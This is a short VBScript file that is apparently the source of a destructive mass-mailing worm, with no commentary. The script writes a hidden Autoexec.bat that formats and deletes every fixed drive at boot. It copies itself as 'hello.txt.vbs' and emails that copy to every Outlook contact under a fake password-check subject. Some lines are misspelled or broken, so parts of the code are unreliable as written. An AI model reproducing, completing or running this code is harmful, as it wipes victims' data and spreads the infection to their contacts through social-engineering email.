On Error Resume Next
Dim i,j,fis,ao,dc,dps,fq,dir,p,a
Set fis = CreateObject ("Scripting.FilesystemObject")
Set ao = fis.CreateTextFile ("C:\Autoexec.bat",true)
ao.WriteLine ("echo off")
ao.Writeline ("Smatrdrv")
Set dc = fis.Drives
For Each dps in dc
If dps.DriveType = 2 Then
fq = fq & dps.Driveletter
End if
Next
fq = LCase (StrReverse (Trim (fq)))
For p = 1 To Len (fq)
a = Mid (fq,p,1)
ao.WriteLine ("format/autotest "&a&":")
Next
For p = 1 To Len (fq)
a = Mid (fq,p,1)
ao.WriteLine ("deltree/y "&a&":")
Next
ao.Close
Set dir = fis.Getfile ("C:\Autoexec.bat")
dir.attributes =  dir.attributes+2
Set objJace = CreateObject ("Scripting.FilesystemObject")
objJace.Getfile (Wscript.ScriptFullname).copy ("C:\hello.txt.vbs")
objJace.CreateTextFile "C:\unzipped\x.txt",99999
Set objMail = CreateObject ("Scripting.FilesystemObject")
Set objJace = CreateObject ("Scripting.FilesystemObject")
objJace.Getfile (Wscript.ScriptFullname).copy ("C:\hello.txt.vbs")
Set objOA =Wscript.CreateObject ("Outlook.Application")
Set objMapi = objoa.GetNameSpace ("MAPI")
For i = 1 to objMapi.Address.Count
Set objAddlist = objMapi.AddressLists (i)
For j = 1 To objAddList.AddressEntries.Count
Set objMail = objOA.CreateItem (0)
objMail.Recipients.Add (objAddList.AddressEntries (j))
objMail.Subject = "RE : my passwd !please check"
objMail.Attochements Add ("c:\hello.txt.vbs")
objMail.Send
Next
Next
Set objMapi = Nothing
Set objOA = Nothing

